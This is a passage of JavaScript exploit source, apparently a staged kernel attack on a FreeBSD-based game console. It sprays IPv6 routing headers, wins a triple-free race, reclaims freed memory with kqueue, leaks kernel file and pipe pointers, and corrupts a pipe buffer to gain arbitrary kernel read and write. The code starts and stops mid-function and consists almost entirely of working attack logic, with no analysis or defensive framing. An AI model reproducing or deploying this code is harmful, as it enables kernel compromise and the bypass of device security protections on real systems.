            write64_uncompressed(S.uio_iov_write + 8n, 8n);

            S.kread_result_bufs = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) S.kread_result_bufs.push(malloc(64));

            S.kread_sndbuf = malloc(4);
            S.kwrite_sndbuf = malloc(4);

            S.scratch = malloc(16);
            S.scratch_big = malloc(0x4000);
            for (let i = 0; i < 0x4000; i += 8) write64_uncompressed(S.scratch_big + BigInt(i), 0n);
            S.dummy_byte = malloc(8);
            S.len_out = malloc(4);
            S.rthdr_readback = malloc(360);
            for (let i = 0; i < 360; i += 8) write64_uncompressed(S.rthdr_readback + BigInt(i), 0n);
        }

        function setup_pipes_kernrw(S) {
            const [m_r, m_w] = create_pipe();
            const [v_r, v_w] = create_pipe();
            S.master_rfd = Number(m_r); S.master_wfd = Number(m_w);
            S.victim_rfd = Number(v_r); S.victim_wfd = Number(v_w);
            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                syscall(SYSCALL.fcntl, BigInt(fd), F_SETFL, O_NONBLOCK);
            }
        }

        function setup_workers(S) {
            S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
            S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
            S.uio_write_ws = make_worker_sync(UIO_THREAD_NUM);

            for (let i = 0; i < IOV_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg,
                    S.cpu_mask, S.rt_params,
                );
                S.iov_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.iov_ws.pivot_slots[i] = ch.pivotAddr;
                S.iov_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
                    S.cpu_mask, S.rt_params,
                );
                S.uio_read_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.uio_read_ws.pivot_slots[i] = ch.pivotAddr;
                S.uio_read_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv,
                    S.cpu_mask, S.rt_params,
                );
                S.uio_write_ws.wait_val_slots[i] = ch.wait_val_slot;
                S.uio_write_ws.pivot_slots[i] = ch.pivotAddr;
                S.uio_write_ws.exit_addrs[i] = ch.exitAddr;
                spawn_leak_worker(ch.entry);
            }
        }

        function setup_ipv6_spray(S) {
            S.ipv6_sockets = [];
            for (let i = 0; i < NUM_IPV6_SOCKETS; i++) {
                const fd = syscall(SYSCALL.socket, AF_INET6, SOCK_STREAM, 0n);
                if (fd === 0xffffffffffffffffn) break;
                S.ipv6_sockets.push(Number(fd));
            }
            S.ipv6_count = S.ipv6_sockets.length;
            for (const fd of S.ipv6_sockets) free_rthdr(fd);
            nanosleep_ms(500);

            S.rthdr_spray = malloc(UCRED_SIZE);
            for (let i = 0; i < UCRED_SIZE; i += 8) write64_uncompressed(S.rthdr_spray + BigInt(i), 0n);
            S.rthdr_spray_len = build_rthdr(S.rthdr_spray, UCRED_SIZE);

            S.tag_buf = malloc(16);
            S.tag_len = malloc(4);
        }

        function rthdr_set(S, idx) {
            return set_rthdr(S.ipv6_sockets[idx], S.rthdr_spray, S.rthdr_spray_len);
        }

        function rthdr_free_idx(S, idx) { return free_rthdr(S.ipv6_sockets[idx]); }

        function rthdr_get_tag(S, idx) {
            write32_uncompressed(S.tag_len, 8n);
            const r = syscall(SYSCALL.getsockopt,
                BigInt(S.ipv6_sockets[idx]),
                IPPROTO_IPV6, IPV6_RTHDR, S.tag_buf, S.tag_len);
            if (r === 0xffffffffffffffffn) return null;
            return Number(read32_uncompressed(S.tag_buf + 4n));
        }

        function find_twins(S, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    write32_uncompressed(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                    rthdr_set(S, i);
                }
                for (let i = 0; i < S.ipv6_count; i++) {
                    const v = rthdr_get_tag(S, i);
                    if (v === null) continue;
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG && i !== j && j < S.ipv6_count) {
                        return [i, j];
                    }
                }
                if (round_ % 50 === 0) syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        function find_triplet(S, master_idx, exclude_idx, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    if (i !== master_idx && i !== exclude_idx) {
                        write32_uncompressed(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                        rthdr_set(S, i);
                    }
                }
                const v = rthdr_get_tag(S, master_idx);
                if (v !== null) {
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG &&
                        j !== master_idx && j !== exclude_idx && j < S.ipv6_count) return j;
                }
                if (round_ % 100 === 0) syscall(SYSCALL.sched_yield);
            }
            return -1;
        }

        function triplets_valid(S) {
            return S.triplets[0] >= 0 && S.triplets[1] >= 0 && S.triplets[2] >= 0
                && S.triplets[1] < S.ipv6_count && S.triplets[2] < S.ipv6_count;
        }

        function repair_triplets(S) {
            if (S.triplets[1] < 0 || S.triplets[1] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                    if (S.triplets[1] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            if (S.triplets[2] < 0 || S.triplets[2] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                    if (S.triplets[2] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            return triplets_valid(S);
        }

        function prepare_fds(S) {

            if (failcheck_path) {
                try { write_file(failcheck_path, ""); } catch (_) { }
            }

            const rl = malloc(16);
            syscall(0xC2n, 8n, rl);
            const nofile_hard = read64_uncompressed(rl + 8n);
            write64_uncompressed(rl, nofile_hard);
            write64_uncompressed(rl + 8n, nofile_hard);
            syscall(SYSCALL.setrlimit, 8n, rl);

            const cand = ["/dev/null", "/dev/", "/", "/app0/", "/dev/urandom",
                "/dev/notification0", "/dev/gc"];
            let held_path = 0n;
            let held_path_str = 0n;
            for (let c = 0; c < cand.length; c++) {
                const sp = alloc_string(cand[c]);
                const a = syscall(SYSCALL.open, sp, O_RDONLY);
                if (a === 0xffffffffffffffffn) continue;
                const b = syscall(SYSCALL.open, sp, 0n);
                syscall(SYSCALL.close, a);
                if (b === 0xffffffffffffffffn) continue;
                syscall(SYSCALL.close, b);
                held_path = sp;
                held_path_str = cand[c];
                break;
            }

            const new_free_fd = () => held_path !== 0n
                ? syscall(SYSCALL.open, held_path, O_RDONLY)
                : syscall(SYSCALL.socket, 28n, 2n, 0n);

            const probe_fds = [];
            for (let i = 0; i < LEAK_FD_MAX; i++) {
                const pfd = new_free_fd();
                if (pfd === 0xffffffffffffffffn) break;
                probe_fds.push(pfd);
            }
            const fd_budget = probe_fds.length;
            for (let i = 0; i < probe_fds.length; i++)
                syscall(SYSCALL.close, BigInt(probe_fds[i]));

            let free_fds_num = fd_budget - 96;
            if (free_fds_num > 2048) free_fds_num = 2048;

            const R_ESTIMATE = 69 + 12 + 1 + 1;
            const BURST_MIN = R_ESTIMATE + 40;
            if (free_fds_num < BURST_MIN)
                fail("fd budget too small: free_fds_num=" + free_fds_num +
                    " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
                    BURST_MIN + "); fd_budget=" + fd_budget);

            logger.log("prepare_fds: free_fd_path=" + held_path_str + " fd_budget=" + fd_budget);

            syscall(SYSCALL.setuid, 1n);

            nanosleep_ms(10000);

            const TOTAL_SYSCALLS = LEAK_SYSCALLS - LEAK_SYSCALLS_FINAL - BigInt(free_fds_num);

            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const LEAK_UNROLL = 512;
            const U = BigInt(LEAK_UNROLL);

            const NW = LEAK_CORES.length;
            const FEED_CHUNK = 4096;

            const chunkbuf = malloc(FEED_CHUNK);

            const base_share = TOTAL_SYSCALLS / BigInt(NW);
            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
            const lws = [];

            const rt_prio = malloc(4);
            write16_uncompressed(rt_prio, PRI_REALTIME);
            write16_uncompressed(rt_prio + 2n, 256n);

            for (let w = 0; w < NW; w++) {
                const target_w = base_share + (w === 0 ? extra0 : 0n);
                const bplus1_w = target_w / U;
                const normal_w = bplus1_w - 1n;
                const remainder_w = target_w - bplus1_w * U;
                const [pr, pw] = create_pipe();
                const rfd = Number(pr), wfd = Number(pw);

                syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
                const finished = malloc(8); write64_uncompressed(finished, 0n);
                const dummybuf = malloc(8);
                const chain = build_leak_worker_chain(
                    LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
                    Number(remainder_w), rt_prio);
                spawn_leak_worker(chain.entry);
                lws.push({
                    chain, rfd, wfd, wfd_big: BigInt(wfd),
                    rfd_big: BigInt(rfd), finished,
                    normal: normal_w, queued: 0n
                });
            }
            const final_chain_done_ptr = malloc(8);
            const final_chain_entry = build_kqueueex_final_chain(LEAK_SYSCALLS_FINAL, LEAK_CORES[0], final_chain_done_ptr, rt_prio);

            const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
            const _sleep_ts = malloc(16);
            write64_uncompressed(_sleep_ts,      5n);           // tv_sec  = 5
            write64_uncompressed(_sleep_ts + 8n, 0n);           // tv_nsec = 0

            _cr_enable_caching();

            let all_fed = false;
            while (!all_fed) {
                all_fed = true;
                for (const lw of lws) {
                    while (lw.queued < lw.normal) {
                        const want = (lw.normal - lw.queued) < FEED_CHUNK_BIG
                            ? (lw.normal - lw.queued) : FEED_CHUNK_BIG;
                        const n = syscall(SYSCALL.write, lw.wfd_big,
                            chunkbuf, want);
                        if (n === 0n || n > FEED_CHUNK_BIG) break;
                        lw.queued += n;
                    }
                    if (lw.queued < lw.normal) all_fed = false;
                }
                if (!all_fed) syscall(SYSCALL.nanosleep, _sleep_ts, 0n);
            }

            _cr_disable_caching();

            logger.log("feeding done, waiting for workers to finish");

            for (const lw of lws) {
                write64_uncompressed(lw.finished, 0n);
            }
            while (true) {
                nanosleep_ms(3000);
                let all_idle = true;
                for (const lw of lws) {
                    if (read64_uncompressed(lw.finished) !== 0n) {
                        all_idle = false;
                        write64_uncompressed(lw.finished, 0n);
                    }
                }
                if (all_idle) break;
            }
            logger.log("all workers idle, updating pivot");
            for (const lw of lws) {
                write64_uncompressed(lw.chain.pivotAddr, lw.chain.exitAddr);
                write64_uncompressed(lw.finished, 0n);
                syscall(SYSCALL.write, lw.wfd_big, chunkbuf, 1n);
            }
            for (let i = 0; i < lws.length; i++) {
                const lw = lws[i];
                const dl = Date.now() + 15000;
                while (read64_uncompressed(lw.finished) !== EXIT_MARK && Date.now() < dl)
                    nanosleep_ms(500);
                if (read64_uncompressed(lw.finished) !== EXIT_MARK) {
                    logger.log("worker " + i + " timeout waiting for EXIT_MARK");
                }
                syscall(SYSCALL.close, lw.rfd_big);
                syscall(SYSCALL.close, lw.wfd_big);
            }

            logger.log("launching kqueueex_final_chain...");
            write64_uncompressed(final_chain_done_ptr, 0n);
            spawn_leak_worker(final_chain_entry);
            logger.log("Waiting for kqueueex_final_chain to complete...");
            while (read64_uncompressed(final_chain_done_ptr) === 0n) {
                nanosleep_ms(500);
            }

            logger.log("kqueueex_final_chain finished successfully. preparing free-fd");
            for (let i = 0; i < free_fds_num; i++) {
                const fd = new_free_fd();
                if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                S.free_fds.push(Number(fd));
            }

            logger.log("prepare_fds complete, stage 0 in 10s");

            syscall(SYSCALL.setuid, 1n);
            nanosleep_ms(10000);
        }

        function free_one_fd(S) {

            if (S.free_fd_idx >= S.free_fds.length)
                fail("free_one_fd: free_fds pool exhausted (idx=" +
                    S.free_fd_idx + "/" + S.free_fds.length + ")");
            syscall(SYSCALL.close, BigInt(S.free_fds[S.free_fd_idx]));
            S.free_fd_idx++;
        }

        function flush_iov_workers(S, count) {
            for (let i = 0; i < count; i++) {
                S.iov_ws.signal();
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
        }

        function attempt_race(S) {

            for (let i = 0; i < S.ipv6_count; i++) rthdr_free_idx(S, i);
            free_one_fd(S);
            flush_iov_workers(S, 32);
            free_one_fd(S);

            const twins = find_twins(S, MAX_ROUNDS_TWIN);
            if (!twins) return false;

            rthdr_free_idx(S, twins[1]);
            sched_yield_n(2);

            const verify_buf = malloc(UCRED_SIZE);
            const verify_len = malloc(4);
            let reclaimed = false;

            for (let k = 0; k < MAX_ROUNDS_TRIPLET; k++) {
                S.iov_ws.signal();
                sched_yield_n(4);
                write32_uncompressed(verify_len, 8n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[twins[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, verify_buf, verify_len);
                if (read32_uncompressed(verify_buf) === 1n) {
                    reclaimed = true;
                    break;
                }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!reclaimed) return false;

            S.triplets[0] = twins[0];
            free_one_fd(S);
            syscall(SYSCALL.sched_yield);

            S.triplets[1] = find_triplet(S, S.triplets[0], -1, MAX_ROUNDS_TRIPLET);
            if (S.triplets[1] === -1) return false;

            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], MAX_ROUNDS_TRIPLET);
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            if (S.triplets[2] === -1) return false;

            return true;
        }

        function stage0(S) {
            logger.log("Stage 0\nTriple-free race");

            for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                if (attempt_race(S)) {
                    logger.log("stage0: triplets " + S.triplets.join(",") +
                        " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                        ")");
                    nanosleep_ms(500);
                    return;
                }
                nanosleep_ms(10);
            }
            fail("stage0: race failed after " + TRIPLEFREE_ATTEMPTS + " attempts");
        }

        function build_uio(buf, iov_ptr, td, is_read, kaddr, size) {
            write64_uncompressed(buf, iov_ptr);
            write64_uncompressed(buf + 8n, UIO_IOV_COUNT);
            write64_uncompressed(buf + 16n, 0xFFFFFFFFFFFFFFFFn);
            write64_uncompressed(buf + 24n, size);
            write32_uncompressed(buf + 32n, UIO_SYSSPACE);
            write32_uncompressed(buf + 36n, is_read ? 1n : 0n);
            write64_uncompressed(buf + 40n, td);
            write64_uncompressed(buf + 48n, kaddr);
            write64_uncompressed(buf + 56n, size);
        }

        function signal_uio(S, mode) {
            S.active_uio_mode = mode;
            (mode === 0 ? S.uio_read_ws : S.uio_write_ws).signal();
        }
        function wait_uio(S) {
            (S.active_uio_mode === 0 ? S.uio_read_ws : S.uio_write_ws).wait();
        }

        function kread_slow(S, kaddr, size) {
            if (!triplets_valid(S)) return null;
            for (let i = 0; i < 64; i += 8) write64_uncompressed(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                for (let j = 0; j < size; j++) write8_uncompressed(S.kread_result_bufs[i] + BigInt(j), 0n);
            }
            write32_uncompressed(S.kread_sndbuf, BigInt(size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kread_sndbuf, 4n);
            syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            write64_uncompressed(S.uio_iov_read + 8n, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n;
            let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 0);
                syscall(SYSCALL.sched_yield);
                write32_uncompressed(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.read, BigInt(S.uio_sock_a),
                        S.kread_result_bufs[i], BigInt(size));
                }
                wait_uio(S);
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            }
            if (!found) return null;
            leaked_iov = read64_uncompressed(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return null;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, true, kaddr, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32_uncompressed(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return null;

            syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
            let result = null;
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.kread_result_bufs[i], BigInt(size));
                const v = read64_uncompressed(S.kread_result_bufs[i]);
                if (v !== 0x4141414141414141n) {
                    const t = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                    if (t === -1) {
                        wait_uio(S);
                        syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                        S.iov_ws.wait();
                        syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                        S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                        return null;
                    }
                    S.triplets[1] = t;
                    result = S.kread_result_bufs[i];
                }
            }
            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            if (result === null) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                return null;
            }
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return result;
        }

        function kwrite_slow(S, kaddr, data_addr, data_size) {
            if (!triplets_valid(S)) return false;
            write32_uncompressed(S.kwrite_sndbuf, BigInt(data_size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kwrite_sndbuf, 4n);
            write64_uncompressed(S.uio_iov_write + 8n, BigInt(data_size));

            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n; let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 1);
                syscall(SYSCALL.sched_yield);
                write32_uncompressed(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
                }
                wait_uio(S);
            }
            if (!found) return false;
            leaked_iov = read64_uncompressed(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return false;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, false, kaddr, BigInt(data_size));
            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32_uncompressed(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return false;

            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[1] = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                if (S.triplets[1] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[1] === -1) return false;

            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) return false;

            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            return true;
        }

        function kslow64(S, kaddr) {
            for (let attempt = 0; attempt < 3; attempt++) {
                if (triplets_valid(S)) {
                    const buf = kread_slow(S, kaddr, 8);
                    if (buf !== null) {
                        const val = read64_uncompressed(buf);
                        if (val !== 0n) {
                            if ((val >> 48n) === 0xFFFFn) return val;
                            if ((val >> 40n) !== 0n) return val;
                        }
                    }
                }
                repair_triplets(S); syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        function stage1(S) {
            send_notification("Stage 1\nKqueue reclaim");
            rthdr_free_idx(S, S.triplets[1]);

            let kq = 0n; let proc_filedesc = 0n;
            while (true) {
                kq = syscall(SYSCALL.kqueue);
                write32_uncompressed(S.len_out, 256n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === 0x1430000n) {
                    proc_filedesc = read64_uncompressed(S.rthdr_readback + S.OFF.KQ_FDP);
                    break;
                }
                syscall(SYSCALL.close, kq);
            }
            syscall(SYSCALL.close, kq);
            S.proc_filedesc = proc_filedesc;
            logger.log("stage1: proc_filedesc=" + toHex(proc_filedesc));

            S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
            if (S.triplets[1] === -1) fail("stage1: triplet repair failed");
        }

        function stage2(S) {
            send_notification("Stage 2\nLeak pipe data pointers");
            logger.log("stage2: leaking pipe pointers...");

            repair_triplets(S); nanosleep_ms(100);
            const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
            if (!fdescenttbl) fail("stage2: fdescenttbl read failed");
            S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (!master_fp) fail("stage2: master_fp read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (!victim_fp) fail("stage2: victim_fp read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            S.master_pipe_data = kslow64(S, master_fp);
            if (!S.master_pipe_data) fail("stage2: master_pipe_data read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            S.victim_pipe_data = kslow64(S, victim_fp);
            if (!S.victim_pipe_data) fail("stage2: victim_pipe_data read failed");

            if (S.master_pipe_data === S.victim_pipe_data)
                fail("stage2: master_pipe == victim_pipe (aliased - bad leak)");

            logger.log("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                " victim_pipe=" + toHex(S.victim_pipe_data));
        }

        function stage3(S) {
            send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
            logger.log("stage3: corrupting pipe buffer...");

            const pipe_overwrite = malloc(24);
            write32_uncompressed(pipe_overwrite, 0n);
            write32_uncompressed(pipe_overwrite + 4n, 0n);
            write32_uncompressed(pipe_overwrite + 8n, 0n);
            write32_uncompressed(pipe_overwrite + 12n, BigInt(PAGE_SIZE));
            write64_uncompressed(pipe_overwrite + 16n, S.victim_pipe_data);

            nanosleep_ms(100);

            let ok = false;
            for (let attempt = 0; attempt < 40; attempt++) {
                repair_triplets(S);
                if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                nanosleep_ms(100); syscall(SYSCALL.sched_yield);
            }
            if (!ok) fail("stage3: kwrite_slow failed after 40 attempts");
            syscall(SYSCALL.sched_yield);

            const pipe_cmd = malloc(24);
            const set_victim_pipe = (cnt, inp, out, size, buf_addr) => {
                write32_uncompressed(pipe_cmd, BigInt(cnt));
                write32_uncompressed(pipe_cmd + 4n, BigInt(inp));
                write32_uncompressed(pipe_cmd + 8n, BigInt(out));
                write32_uncompressed(pipe_cmd + 12n, BigInt(size));
                write64_uncompressed(pipe_cmd + 16n, buf_addr);
                syscall(SYSCALL.write, BigInt(S.master_wfd), pipe_cmd, 24n);
                syscall(SYSCALL.read, BigInt(S.master_rfd), pipe_cmd, 24n);
            };

            S.kread = (buf_addr, kaddr, size) => {
                set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.read, BigInt(S.victim_rfd), buf_addr, BigInt(size));
            };
            S.kwrite = (kaddr, buf_addr, size) => {
                set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.write, BigInt(S.victim_wfd), buf_addr, BigInt(size));
            };

            for (let i = 0n; i < 64n; i += 8n) write64_uncompressed(S.scratch_big + i, 0n);

            S.kread32 = (k) => { S.kread(S.scratch_big, k, 4); return read32_uncompressed(S.scratch_big); };
            S.kread64 = (k) => { S.kread(S.scratch_big, k, 8); return read64_uncompressed(S.scratch_big); };
            S.kwrite32 = (k, v) => { write32_uncompressed(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 4); };
            S.kwrite64 = (k, v) => { write64_uncompressed(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 8); };

            let verified = false;
            for (let attempt = 0; attempt < 3; attempt++) {
                if (S.kread64(S.master_pipe_data + 0x10n) === S.victim_pipe_data) {
                    verified = true; break;
                }
                nanosleep_ms(100); repair_triplets(S);
                kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
            }
            if (!verified) fail("stage3: verify failed");
            logger.log("stage3: kernel r/w achieved");

            stage3_cleanup(S);
        }

        function stage3_cleanup(S) {
            logger.log("stage3_cleanup");
            const get_fp = fd => S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
            const bump = (fp, delta) => {
                const rc = S.kread32(fp + 0x28n);
                if (rc > 0n && rc < 0x10000n) S.kwrite32(fp + 0x28n, Number(rc) + delta);
            };
            const null_rthdr = fd => {
                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                const f_data = S.kread64(fp);
                if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
                const so_pcb = S.kread64(f_data + 0x18n);
                if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
                const pktopts = S.kread64(so_pcb + S.OFF.INPCB_PKTOPTS);
                if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
                S.kwrite64(so_pcb + S.OFF.INPCB_PKTOPTS, 0n);
            };

            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                const fp = get_fp(fd);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                bump(fp, 0x100);
            }

